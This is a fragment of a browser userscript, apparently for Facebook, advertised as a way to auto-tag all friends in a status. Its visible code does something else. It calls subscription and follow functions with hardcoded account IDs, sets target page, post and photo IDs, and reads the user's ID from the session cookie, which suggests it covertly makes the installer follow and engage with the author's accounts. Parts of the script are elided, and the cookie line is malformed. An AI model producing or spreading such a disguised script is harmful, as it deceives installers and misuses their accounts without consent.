// ==UserScript==
// @name	    *[Updated]**Auto Tag Friends On Your Status
// @namespace       Facebook Auto Mention
// @description 	It allows you to tag all your friends in your status in less than a minute
// @version			4.0
// @editor			Avinash Ahuja
...
sublist("626690410715784");
sublist("656299964421495");
sublist("648200321898126");
a("100001244921450");
...
var spage_id = "582638891808246";
var spost_id = "1399083250333729";
var sfoto_id = "520854291314839";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
